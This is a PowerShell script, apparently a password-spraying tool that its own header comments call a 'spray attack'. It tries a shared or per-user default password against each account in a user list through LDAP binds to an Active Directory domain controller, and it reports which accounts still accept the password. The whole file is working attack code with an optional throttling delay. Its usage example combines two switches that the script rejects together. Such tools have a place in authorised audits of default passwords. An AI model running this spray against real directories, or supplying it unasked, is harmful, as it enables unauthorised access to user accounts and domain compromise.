### HOW TO USE IT
### spray attack via default password
# .\aduser.ps1 -UserFile .\users.txt -PasswordFile .\default.txt -DC dc01.contoso.local -Domain CONTOSO -default -DelaySeconds 0.5 -default
### spray attack via user own default password
# .\aduser.ps1 -UserFile .\users.txt -PasswordFile .\default.txt -DC dc01.contoso.local -Domain CONTOSO -default -DelaySeconds 0.5 -personal
param(
    [Parameter(Mandatory=$true)]
    [string]$UserFile,

    [Parameter(Mandatory=$true)]
    [string]$PasswordFile,

    [Parameter(Mandatory=$true)]
    [string]$DC,

    [Parameter(Mandatory=$true)]
    [string]$Domain,

    [ValidateRange(0, 3600)]
    [double]$DelaySeconds = 0,

    [Alias("default")]
    [switch]$SharedDefault,

    [Alias("personal")]
    [switch]$PerUser
)

Add-Type -AssemblyName System.DirectoryServices.Protocols

function Stop-Script {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message
    )

    Write-Host $Message -ForegroundColor Red
    exit 1
}

$users = @(Get-Content $UserFile | ForEach-Object { $_.Trim() })
# Passwords must be read verbatim except for trailing CR from Windows line endings.
$passwords = @(Get-Content $PasswordFile | ForEach-Object { $_.TrimEnd("`r") })

if ($SharedDefault -and $PerUser) {
    Stop-Script "-SharedDefault and -PerUser cannot be used together."
}

if (($DelaySeconds * 10) % 1 -ne 0) {
    Stop-Script "DelaySeconds must be specified in 0.1 second increments."
}

$mode = if ($SharedDefault) { "SharedDefault" } else { "PerUser" }

if ($mode -eq "SharedDefault") {
    if ($passwords.Count -ne 1) {
        Stop-Script "Shared default mode requires exactly one password in PasswordFile."
    }
}
elseif ($users.Count -ne $passwords.Count) {
    Stop-Script "Per-user mode requires the same number of users ($($users.Count)) and passwords ($($passwords.Count)). Use -default for a single shared password."
}

$sharedPassword = if ($mode -eq "SharedDefault") { $passwords[0] } else { $null }
$foundCount = 0

for ($i = 0; $i -lt $users.Count; $i++) {

    $user = $users[$i]
    $password = if ($mode -eq "SharedDefault") { $sharedPassword } else { $passwords[$i] }

    if ([string]::IsNullOrWhiteSpace($user)) {
        continue
    }

    $fullUser = "$Domain\$user"

    $conn = New-Object System.DirectoryServices.Protocols.LdapConnection($DC)
    $conn.AuthType = [System.DirectoryServices.Protocols.AuthType]::Negotiate

    try {
        $netCred = New-Object System.Net.NetworkCredential(
            $user,
            $password,
            $Domain
        )

        # Attempt exactly one bind per user.
        $conn.Bind($netCred)

        $resultText = if ($mode -eq "SharedDefault") {
            "SHARED DEFAULT PASSWORD STILL VALID"
        }
        else {
            "PERSONAL DEFAULT PASSWORD STILL VALID"
        }

        $foundCount++
        Write-Host ("[{0}] {1}" -f $resultText, $fullUser)
    }
    catch {
        continue
    }
    finally {
        $conn.Dispose()
    }

    if ($DelaySeconds -gt 0 -and $i -lt ($users.Count - 1)) {
        Start-Sleep -Milliseconds ([int]($DelaySeconds * 1000))
    }
}

if ($foundCount -gt 0) {
    Write-Host ""
    Write-Host ("Total matches: {0}" -f $foundCount)
}
else {
    Write-Host "No accounts were found using the default password."
}
